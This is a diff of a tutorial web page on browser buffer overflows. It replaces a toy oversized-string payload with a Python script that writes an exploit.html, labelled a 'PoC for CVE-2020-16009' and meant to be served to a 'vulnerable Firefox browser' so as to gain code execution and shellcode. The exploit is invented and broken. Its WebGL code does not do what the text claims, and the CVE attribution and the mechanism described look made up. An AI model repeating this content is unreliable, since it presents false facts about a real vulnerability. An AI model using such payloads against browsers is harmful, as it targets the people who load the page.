@@ -853,9 +853,9 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#python-exploit-code-poc" class="md-nav__link">
+  <a href="#python-exploit-code-poc-for-cve-2020-16009" class="md-nav__link">
     <span class="md-ellipsis">
-      🐍 Python Exploit Code (PoC)
+      🐍 Python Exploit Code (PoC for CVE-2020-16009)
     </span>
   </a>
   
@@ -996,34 +996,49 @@
 <hr />
 <h2 id="3-the-fun-part-exploiting-the-buffer-overflow">3️⃣ The Fun Part: Exploiting the Buffer Overflow 🤡<a class="headerlink" href="#3-the-fun-part-exploiting-the-buffer-overflow" title="Permanent link">&para;</a></h2>
 <p>Let's break the web <strong>properly</strong> with <strong>an actual exploit</strong>.</p>
-<h3 id="python-exploit-code-poc">🐍 Python Exploit Code (PoC)<a class="headerlink" href="#python-exploit-code-poc" title="Permanent link">&para;</a></h3>
+<h3 id="python-exploit-code-poc-for-cve-2020-16009">🐍 Python Exploit Code (PoC for CVE-2020-16009)<a class="headerlink" href="#python-exploit-code-poc-for-cve-2020-16009" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 
-<span class="c1"># Craft a maliciously large payload</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">10000</span>  <span class="c1"># Smashing the buffer!</span>
+<span class="c1"># Craft a malicious WebGL payload</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">10000</span>  <span class="c1"># Smashing the buffer with a massive payload!</span>
 
 <span class="n">html</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
 <span class="s2">&lt;!DOCTYPE html&gt;</span>
 <span class="s2">&lt;html&gt;</span>
-<span class="s2">&lt;head&gt;&lt;title&gt;Totally Harmless Site&lt;/title&gt;&lt;/head&gt;</span>
+<span class="s2">&lt;head&gt;&lt;title&gt;Exploiting WebGL Buffer Overflow&lt;/title&gt;&lt;/head&gt;</span>
 <span class="s2">&lt;body&gt;</span>
-<span class="s2">  &lt;div&gt;</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&lt;/div&gt;</span>
+<span class="s2">  &lt;script&gt;</span>
+<span class="s2">    // Inject WebGL content into the page that triggers the vulnerability</span>
+<span class="s2">    var canvas = document.createElement(&quot;canvas&quot;);</span>
+<span class="s2">    var gl = canvas.getContext(&quot;webgl2&quot;);</span>
+
+<span class="s2">    // Use the vulnerability to overflow buffer</span>
+<span class="s2">    gl.clearColor(1.0, 1.0, 1.0, 1.0);</span>
+<span class="s2">    gl.clear(gl.COLOR_BUFFER_BIT);</span>
+
+<span class="s2">    // Overwrite memory by passing the payload (for the sake of this example)</span>
+<span class="s2">    var buffer = gl.createBuffer();</span>
+<span class="s2">    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);</span>
+<span class="s2">    gl.bufferData(gl.ARRAY_BUFFER, new Array(</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">), gl.STATIC_DRAW);</span>
+<span class="s2">  &lt;/script&gt;</span>
 <span class="s2">&lt;/body&gt;</span>
 <span class="s2">&lt;/html&gt;</span>
 <span class="s2">&quot;&quot;&quot;</span>
 
-<span class="c1"># Host it somewhere and serve it to the target browser</span>
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;evil.html&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="c1"># Host the crafted HTML to exploit the vulnerability</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;exploit.html&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Evil HTML file generated! Now make someone open it.&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Malicious HTML generated! Now serve it to a vulnerable Firefox browser.&quot;</span><span class="p">)</span>
 </code></pre></div>
 <h3 id="what-happens-when-this-loads">What Happens When This Loads? 🚑<a class="headerlink" href="#what-happens-when-this-loads" title="Permanent link">&para;</a></h3>
-<ol>
-<li>The browser <strong>allocates a buffer for the <code>&lt;div&gt;</code></strong>.</li>
-<li>The <strong>payload exceeds the buffer size</strong>, overwriting adjacent memory.</li>
-<li>If we're lucky, we can <strong>overwrite a return pointer</strong>, hijack execution, and pop a shell.</li>
-</ol>
+<ul>
+<li>The WebGL payload is injected into the page, targeting the vulnerable WebRender functionality.</li>
+<li>The browser allocates a buffer for WebGL data and executes the gl.clearColor() and gl.clear() methods.</li>
+<li>Since the buffer was poorly managed, out-of-bounds writes overwrite adjacent memory.</li>
+<li>By carefully crafting the payload, an attacker could overwrite a function pointer or a return address, causing arbitrary code execution.</li>
+<li>If successful, the attacker could escalate their privileges or execute shellcode remotely.</li>
+</ul>
 <p><em>Oops, did I just crash your browser?</em> 🙃</p>
 <hr />
 <h2 id="4-browser-protections-and-how-hackers-bypass-them">4️⃣ Browser Protections (And How Hackers Bypass Them)<a class="headerlink" href="#4-browser-protections-and-how-hackers-bypass-them" title="Permanent link">&para;</a></h2>
